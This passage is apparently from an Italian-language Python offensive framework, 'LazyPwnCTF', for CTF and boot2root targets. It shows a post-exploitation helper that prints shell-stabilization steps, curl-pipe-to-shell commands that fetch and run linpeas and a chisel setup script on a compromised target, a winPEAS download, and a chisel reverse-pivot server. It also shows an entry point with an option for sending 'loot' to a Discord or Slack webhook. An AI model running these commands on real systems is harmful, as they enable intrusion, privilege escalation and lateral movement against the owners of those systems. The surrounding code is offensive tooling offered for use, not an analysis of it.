python3 -c 'import pty;pty.spawn("/bin/bash")' || python -c 'import pty;pty.spawn("/bin/bash")'

[bold cyan]2. Setta TERM:[/bold cyan]
export TERM=xterm

[bold cyan]3. Background e stty raw (Premi Ctrl+Z, poi digita):[/bold cyan]
stty raw -echo; fg
"""

        console.print(Panel(cheatsheet_tty, title="TTY Stabilization Cheatsheet", border_style="magenta"))

        cheatsheet_transfer = f"""[bold cyan]Curl/Wget Drop (Esegui sul target):[/bold cyan]
curl http://{ip}:{assigned_port}/linpeas.sh | sh
wget http://{ip}:{assigned_port}/winPEASany.exe -O %TEMP%\\winPEASany.exe
curl http://{ip}:{assigned_port}/setup_chisel.sh | bash
"""
        console.print(Panel(cheatsheet_transfer, title="File Transfer Cheatsheet", border_style="yellow"))

        cheatsheet_chisel = f"""[bold cyan]Avvia Chisel Server sul tuo host (Attaccante):[/bold cyan]
chisel server -p 8000 --reverse
"""
        console.print(Panel(cheatsheet_chisel, title="Pivoting Cheatsheet", border_style="green"))

        try:
             console.print("[yellow]Server in ascolto... premi Ctrl+C per uscire.[/yellow]")
             while True:
                 import time
                 time.sleep(1)
        except KeyboardInterrupt:
             console.print("\n[red]Spegnimento ShellWhisperer.[/red]")


import argparse
import time

if __name__ == "__main__":
    from rich.prompt import Prompt

    if hasattr(os, "geteuid"):
        if os.geteuid() != 0:
            console.print(Panel(
                "[bold red]ATTENZIONE: Stai eseguendo lo script senza sudo. Nmap perderà la capacità di fare SYN scan e OS detection, compromettendo i risultati.[/bold red]",
                title="WARNING: ROOT REQUIRED", border_style="red blink"
            ))
            time.sleep(3)

    banner = r"""[bold magenta]
 _                     ____               
| |   __ _ _____   _  |  _ \__      ___ __  
| |  / _` |_  / | | | | |_) \ \ /\ / / '_ \ 
| |___ (_| |/ /| |_| | |  __/ \ V  V /| | | |
|_____\__,_/___|\__, | |_|     \_/\_/ |_| |_|
                |___/                        
[/bold magenta]
[bold cyan]Automated CTF & Boot2Root Framework[/bold cyan]
"""
    console.print(banner)

    parser = argparse.ArgumentParser(description="LazyPwnCTF Framework")
    parser.add_argument("ip", nargs="?", help="IP Target da scansionare")
    parser.add_argument("--shell", action="store_true", help="Avvia ShellWhisperer in post-exploitation")
    parser.add_argument("--reset", action="store_true", help="Cancella lo stato precedente e i log per ricominciare da zero")
    parser.add_argument("--webhook", type=str, help="URL Webhook Discord/Slack per ricevere il loot a fine scansione")
    parser.add_argument("--profile", type=str, choices=["stealth", "normal", "aggressive"], default="normal", help="Profilo di esecuzione dei task")

    args, _ = parser.parse_known_args()

    if args.shell:
        whisperer = ShellWhisperer()
        whisperer.run()
        sys.exit(0)

    if not args.ip:
        target_input = Prompt.ask("[bold cyan]Inserisci l'IP Target[/bold cyan]")
        if not target_input.strip():
            console.print("[red]Nessun target fornito. Uscita.[/red]")
            sys.exit(1)
        args.ip = target_input.strip()

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

    try:
        asyncio.run(pipeline(args.ip, os.getcwd(), reset=args.reset, webhook_url=args.webhook, profile=args.profile))
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C rilevato a livello globale. Exiting.")
        sys.exit(0)
